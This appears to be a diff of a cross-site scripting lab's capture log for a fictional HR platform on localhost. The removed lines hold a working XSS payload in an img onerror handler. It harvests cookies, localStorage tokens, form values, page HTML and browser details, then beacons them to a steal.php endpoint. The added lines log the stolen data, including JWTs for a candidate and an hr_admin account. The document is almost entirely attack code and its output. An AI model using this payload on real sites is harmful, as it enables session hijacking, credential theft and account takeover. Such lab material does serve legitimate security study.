@@ -1,23 +1,70 @@
-<img src="x" onerror="var data={cookies:document.cookie||'No cookies (HttpOnly?)',url:window.location.href,title:document.title||'No title',localStorage:JSON.stringify(localStorage)||'No localStorage',sessionStorage:JSON.stringify(sessionStorage)||'No sessionStorage',html:document.documentElement.outerHTML.substring(0,500),forms:(function(){let formData=[];for(let form of document.forms){let fields={};for(let input of form.elements){if(input.name)fields[input.name]=input.value}formData.push(fields)}return JSON.stringify(formData)||'No forms'})(),userAgent:navigator.userAgent||'No userAgent',screen:`${window.screen.width}x${window.screen.height}`||'No screen info',language:navigator.language||'No language',referrer:document.referrer||'No referrer'};new Image().src='http://localhost:8000/steal.php?'+Object.keys(data).map(key=>key+'='+encodeURIComponent(data[key])).join('&');">
-[2025-08-05 10:43:53] Data: {
-    "cookies": ""
-}
-[2025-08-05 10:59:58] Data: {
-    "cookies": "No cookies",
-    "url": "http:\/\/localhost:8080\/candidate-portal"
-}
-
-[2025-08-05 11:03:44] Data: {
+[2025-08-29 08:06:01] Data: {
     "cookies": "No cookies (HttpOnly?)",
-    "url": "http:\/\/localhost:8080\/candidate-portal",
+    "url": "http:\/\/localhost:8080\/candidate-portal?job=2",
     "title": "Big Kahuna Burger HR Platform",
-    "localStorage": "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYW5kaWRhdGUxIiwiZXhwIjoxNzU0NDc0NDg5fQ._XfoNyMuDCCqHCO-i6zHcVPzaiHlZScwfz8wVlUWKk4\"}",
+    "localStorage": "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYW5kaWRhdGUxIiwiZXhwIjoxNzU2NDY3MjEyfQ.jGz675D3acv_8awPduzW1zbkFCicg0FvmTFHewsTxNA\"}",
     "sessionStorage": "{}",
     "html": "<html lang=\"en\"><head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\">\n    <link rel=\"icon\" href=\"\/favicon.ico\">\n    <title>Big Kahuna Burger HR Platform<\/title>\n    <link href=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@5.3.0\/dist\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n    <link href=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/font-awesome\/6.4.0\/css\/all.min.css\" rel=\"stylesheet\">\n  <script d",
     "forms": "[]",
-    "userAgent": "Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko\/20100101 Firefox\/141.0",
-    "screen": "2048x1152",
+    "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/139.0.0.0 Safari\/537.36",
+    "screen": "1680x1050",
     "language": "ru-RU",
     "referrer": "No referrer"
 }
-Сопр. письмо
+
+[2025-08-29 08:10:44] Data: {
+    "cookies": "No cookies (HttpOnly?)",
+    "url": "http:\/\/localhost:8080\/candidate-portal?job=2",
+    "title": "Big Kahuna Burger HR Platform",
+    "localStorage": "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYW5kaWRhdGUxIiwiZXhwIjoxNzU2NDY3MjEyfQ.jGz675D3acv_8awPduzW1zbkFCicg0FvmTFHewsTxNA\"}",
+    "sessionStorage": "{}",
+    "html": "<html lang=\"en\"><head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\">\n    <link rel=\"icon\" href=\"\/favicon.ico\">\n    <title>Big Kahuna Burger HR Platform<\/title>\n    <link href=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@5.3.0\/dist\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n    <link href=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/font-awesome\/6.4.0\/css\/all.min.css\" rel=\"stylesheet\">\n  <script d",
+    "forms": "[]",
+    "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/139.0.0.0 Safari\/537.36",
+    "screen": "1680x1050",
+    "language": "ru-RU",
+    "referrer": "No referrer"
+}
+
+[2025-08-29 08:10:58] Data: {
+    "cookies": "No cookies (HttpOnly?)",
+    "url": "http:\/\/localhost:8080\/hr\/applications",
+    "title": "Big Kahuna Burger HR Platform",
+    "localStorage": "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJocl9hZG1pbiIsImV4cCI6MTc1NjU0MTQ1M30.uzRNUtIybcOn_ZqnJemGpVQ6nGCysiPgHAi1HGPzzDk\"}",
+    "sessionStorage": "{}",
+    "html": "<html lang=\"en\"><head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\">\n    <link rel=\"icon\" href=\"\/favicon.ico\">\n    <title>Big Kahuna Burger HR Platform<\/title>\n    <link href=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@5.3.0\/dist\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n    <link href=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/font-awesome\/6.4.0\/css\/all.min.css\" rel=\"stylesheet\">\n  <script d",
+    "forms": "[]",
+    "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/139.0.0.0 Safari\/537.36",
+    "screen": "1680x1050",
+    "language": "ru-RU",
+    "referrer": "No referrer"
+}
+
+[2025-08-29 08:13:14] Data: {
+    "cookies": "No cookies (HttpOnly?)",
+    "url": "http:\/\/localhost:8080\/candidate-portal",
+    "title": "Big Kahuna Burger HR Platform",
+    "localStorage": "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYW5kaWRhdGUxIiwiZXhwIjoxNzU2NTQxNTg2fQ.B6r4SJ_-aZHL-4l-HB6CwKOzbAZVsRNC-F1zWkCp6Tk\"}",
+    "sessionStorage": "{}",
+    "html": "<html lang=\"en\"><head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\">\n    <link rel=\"icon\" href=\"\/favicon.ico\">\n    <title>Big Kahuna Burger HR Platform<\/title>\n    <link href=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@5.3.0\/dist\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n    <link href=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/font-awesome\/6.4.0\/css\/all.min.css\" rel=\"stylesheet\">\n  <script d",
+    "forms": "[]",
+    "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/139.0.0.0 Safari\/537.36",
+    "screen": "1680x1050",
+    "language": "ru-RU",
+    "referrer": "No referrer"
+}
+
+[2025-08-29 08:14:38] Data: {
+    "cookies": "No cookies (HttpOnly?)",
+    "url": "http:\/\/localhost:8080\/hr\/applications",
+    "title": "Big Kahuna Burger HR Platform",
+    "localStorage": "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJocl9hZG1pbiIsImV4cCI6MTc1NjU0MTY1OX0.QqD5l5_00IBwjA9qd1mtkc7uxW9ZD_1YdLsL3JLik-o\"}",
+    "sessionStorage": "{}",
+    "html": "<html lang=\"en\"><head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\">\n    <link rel=\"icon\" href=\"\/favicon.ico\">\n    <title>Big Kahuna Burger HR Platform<\/title>\n    <link href=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@5.3.0\/dist\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n    <link href=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/font-awesome\/6.4.0\/css\/all.min.css\" rel=\"stylesheet\">\n  <script d",
+    "forms": "[]",
+    "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/139.0.0.0 Safari\/537.36",
+    "screen": "1680x1050",
+    "language": "ru-RU",
+    "referrer": "No referrer"
+}
+
